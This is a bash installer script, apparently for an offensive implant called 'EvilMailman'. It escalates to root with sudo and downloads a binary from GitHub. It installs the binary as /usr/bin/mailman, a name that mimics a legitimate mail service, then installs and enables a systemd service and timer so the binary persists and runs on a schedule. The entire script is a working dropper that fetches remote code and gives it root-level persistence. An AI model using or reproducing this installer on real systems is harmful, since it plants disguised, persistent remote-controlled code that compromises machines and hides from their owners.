#!/usr/bin/env bash

#If we're not root, re-execute as root
[ `whoami` = root ] || exec sudo $0

if command -v wget >/dev/null 2>&1; then
	_download() { wget -O- "$@" ; }
elif command -v curl >/dev/null 2>&1; then
	_download() { curl -fL "$@" ; }
else
    echo "This script needs curl or wget" >&2
    exit 2
fi

cpu=$(uname -m)

_download "https://github.com/FlamingSpork/EvilMailman/releases/latest/download/mailman_linux_$cpu" > /tmp/mailman
chmod +x /tmp/mailman
mv /tmp/mailman /usr/bin/mailman

_download "https://github.com/FlamingSpork/EvilMailman/raw/master/systemd/mailman.service" > /tmp/mm.service
_download "https://github.com/FlamingSpork/EvilMailman/raw/master/systemd/mailman.timer" > /tmp/mm.timer
mv /tmp/mm.service /etc/systemd/system/mailman.service
mv /tmp/mm.timer /etc/systemd/system/mailman.timer

systemctl daemon-reload
systemctl start mailman.timer
systemctl enable mailman.timer